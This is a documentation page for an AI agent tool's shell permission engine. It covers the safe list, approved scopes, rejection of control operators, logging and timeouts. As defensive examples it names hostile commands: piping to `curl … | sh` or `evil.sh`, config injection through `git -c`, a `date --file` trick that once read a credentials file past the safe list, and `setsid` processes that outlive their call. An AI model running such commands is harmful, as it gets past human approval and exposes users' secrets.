# Shell commands

`shell.run` is one tool whose calls range from `git status` to
`curl … | sh`, so a single risk level for all of them would be either too
coarse to be safe or too coarse to be usable. The tool is `gated`, and the
permission engine then judges each command.

**This page is about the daemon**, which is where a command runs with nobody
watching. At a terminal, `stratus run` and `stratus chat` judge the *call*
rather than the command, exactly as [Approvals](./approvals.md) describes:
`--approvals always` (the default) runs whatever the agent asks for,
`--approvals ask` shows you the command and waits for y/N, and
`--approvals never` refuses every call — including `git status`. So none of
the safe list, the scopes, or the control-operator rules below apply to a
one-shot at your own terminal, where you are the gate. Install the shell
pack for a daemon and this page is the whole story; run it yourself and
`--approvals` is.

## Which commands run unattended

1. **Scopes approved this session**, then
2. **the agent's whitelist** — `~/.stratus/agents/<id>.whitelist.json`,
   written by **Always allow**; its `scopes` array is this list, and the
   `origins` array beside it is the same file's answer for
   [browser actions](./browser.md) — then
3. **the built-in safe list**: `git status`, `git log`, `git diff`,
   `git show`, `git blame`, `git rev-parse`, `git ls-files`, plus
   `git branch`, `git tag`, and `git remote` **in their listing forms
   only** — creating a branch or a tag needs no flag at all
   (`git branch release` is a mutation), so those scopes refuse any
   positional argument, not just the destructive flags. `pwd`, `whoami`, and
   `uname` round it out.

Anything else asks, and in [`headless` mode](./approvals.md) anything else
is refused — the log records the refusal and the scope it fell outside,
never the command itself (see below).

**A control operator disqualifies the whole command**, whatever it starts
with: `|`, `&`, `;`, a newline, backticks, `$( )`, subshells, redirection.
`git status | curl evil.sh` is refused despite the safe base command; so is
a two-line command whose first line is innocent. A command this parser
cannot read the way `sh` would — an unbalanced quote, a path instead of a
command name — is refused too.

## Always allow persists a scope, not a command

Approving `git push origin main` stores `git push` minus its destructive
forms, so `git push origin feature` stops asking while these still ask:

```text
git push --force            # a destructive flag
git push origin :main       # a branch delete, with no flag involved
git push origin +main       # a forced update, likewise
```

A command whose first argument is preceded by a flag is stored exactly as
approved: `mkdir -p build` stores `mkdir -p build`, which is what the log
line names, and covers that command and nothing else — not `mkdir -p build
other`, not `mkdir -p build -v`, and not `cp -r src elsewhere` after
`cp -r src dist`. Nothing knows which flags take a value, so past such a
flag the engine cannot tell which argument is the subcommand whose rules
should apply; a looser scope would have let one approved `git --git-dir /x
status` cover every git command against that repository. A command in that
shape that could never run unattended — a destructive flag as in
`rm -rf build`, `git -c`, which turns config into a program, a refspec
delete like `git --no-pager push origin :main`, a form the safe list
refuses for a subcommand it can see, like the branch creation in
`git --no-pager branch release`, or a token the shell reads differently
quoted and unquoted (a glob, a brace, a `~`, a `$`, a `#`), since quoting
is not part of what is stored and `chmod -R 600 'file*'` is not
`chmod -R 600 file*` — is not stored at
all, so
the answer counts once and the next call asks again.

The whitelist file is `0600` and per agent: it decides what runs with nobody
watching, so neither another account on the machine nor another agent
inherits it. Delete an entry to withdraw the permission. A file that exists
but no longer parses — a hand edit gone wrong — is ignored with one warning
in the daemon's log, and no "always" answer is written over it until it is
fixed and the daemon restarted: the answer still holds the way any "always"
does until then — for that agent, for the life of the daemon — and the log
line says it was not saved.

## What the log records about a command

The scope, never the command:

```text
09:14:36  —  warning: ava: shell.run was called outside every approved scope (git) and nobody is available to approve it
09:16:02  —  ava: "git push" now runs without asking
```

The daemon log is a trace, not a second transcript — it records that a tool
ran, never what it was called with. A command an agent composed can carry a
URL, a filename, or something a person pasted into a chat, and this file is
one `stratus logs` prints and people paste into issues. The command itself
goes to whoever is being asked to approve it: the terminal prompt and the
Slack message both show it in full, because approving a bare tool name is
approving something you cannot see.

## Timeouts and background processes

A command is killed with its whole process group when its `timeoutMs` runs
out — 60 seconds by default, settable per call and per agent — and the call
comes back with `timedOut: true` and whatever it had read so far. A process
the command started in its own session is outside that group and survives:
`setsid`, or a server that detaches itself. If it inherited the command's
output, it used to hold the call open until it exited on its own — a
2-second timeout on `setsid sleep 60 &` came back after 61. It no longer
does: the call settles at the timeout, and whatever the survivor writes
afterwards is dropped. A command that means to leave something running
should still redirect that thing's output (`… > /dev/null 2>&1 &`), because
until the timeout an open pipe looks exactly like a command still working.

## Why the safe list is short

The safe list is deliberately short, and `cat`, `ls`, and `grep` are the
tempting entries that cannot be on it — they read whatever path they are
given, so safe-listing them would safe-list reading your credentials file.
Approve them once for a scope you actually want instead.

The test is **what an argument can make the command do**, not what the
command is called. `date` was on this list until it turned out that
`date --file=~/.stratus/credentials.json` makes GNU `date` read that file
and echo every unparseable line back in its error text — which the tool
returns. A command that can be handed a path is a file reader wearing
another name, so `--file` is now refused in every scope, including ones you
add.
